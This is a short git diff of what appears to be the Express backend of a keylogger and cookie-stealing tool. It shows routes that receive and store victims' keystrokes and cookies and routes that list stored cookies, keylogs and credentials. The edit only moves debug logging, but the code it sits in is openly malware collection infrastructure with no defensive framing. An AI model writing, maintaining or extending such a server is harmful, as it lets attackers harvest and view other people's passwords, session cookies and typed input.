@@ -47,7 +47,6 @@ app.get("/show-cookies", (req, res) => {
     if (err) console.log(err);
     else res.send(JSON.stringify(rows));
   });
-  console.log(req.query);
 });
 
 app.get("/show-keylogs", (req, res) => {
@@ -55,7 +54,6 @@ app.get("/show-keylogs", (req, res) => {
     if (err) console.log(err);
     else res.send(JSON.stringify(rows));
   });
-  console.log(req.query);
 });
 
 app.get("/show-credentials", (req, res) => {
@@ -63,7 +61,6 @@ app.get("/show-credentials", (req, res) => {
     if (err) console.log(err);
     else res.send(JSON.stringify(rows));
   });
-  console.log(req.query);
 });
 
 app.post("/cookie", (req, res) => {
@@ -81,6 +78,7 @@ app.post("/keylog", (req, res) => {
   res.send(JSON.stringify(req.body.data));
   if (!checkID(req.headers.uid)) return;
   let database = req.body.data.database;
+  console.log(database);
   for (const entry in database) {
     db.run("INSERT INTO keylog (userId, site, keystrokes) VALUES (?, ?, ?)", [
       req.headers.uid,
